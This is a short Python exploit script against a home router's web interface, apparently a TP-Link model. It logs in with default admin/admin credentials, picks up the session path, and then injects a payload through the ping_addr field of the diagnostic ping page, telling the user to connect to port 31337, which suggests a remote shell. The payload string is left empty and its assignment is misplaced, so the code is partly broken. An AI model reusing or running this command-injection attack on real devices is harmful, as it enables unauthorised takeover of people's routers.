import urllib2
import urllib
import base64
import hashlib

def login(ip, user, pwd):

	hash = hashlib.md5()
	hash.update(pwd)
	auth_string = "%s:%s" %(user, hash.hexdigest())
	encoded_string = base64.b64encode(auth_string)
	print ("[debug] Encoded authorisation: %s" %encoded_string)

	url = "http://" + ip + "/userRpm/LoginRpm.htm?Save=Save"
	print ("[debug] sending login to " + url)
	req = urllib2.Request(url)
	req.add_header('Cookie', 'Authorization=Basic %s' %encoded_string)
	resp = urllib2.urlopen(req)

	data = resp.read()
	next_url = "http://%s/%s/userRpm/" %(ip, data.split("/")[3])
	print ("[debug] Got random path for next stage, url is now %s" %next_url)
	return (next_url, encoded_string)



### attack block put in here
	attackBlock = "" 


def first_exploit(url, auth):

	params = {'ping_addr': attackBlock, 'doType': 'ping', 'isNew': 'new', 'sendNum': '20', 'pSize': '64', 'overTime': '800', 'trHops': '20'}
	new_url = url + "PingIframeRpm.htm?" + urllib.urlencode(params)
	print ("[debug] sending exploit...")
	print ("[+] Please wait a few seconds before connecting to port 31337...")
	req = urllib2.Request(new_url)
	req.add_header('Cookie', 'Authorization=Basic %s' %auth)
	req.add_header('Referer', url + "DiagnosticRpm.htm")                         
	resp = urllib2.urlopen(req)

if __name__ == '__main__':
	data = login("192.168.0.1", "admin", "admin")
	first_exploit(data[0], data[1])
	
	
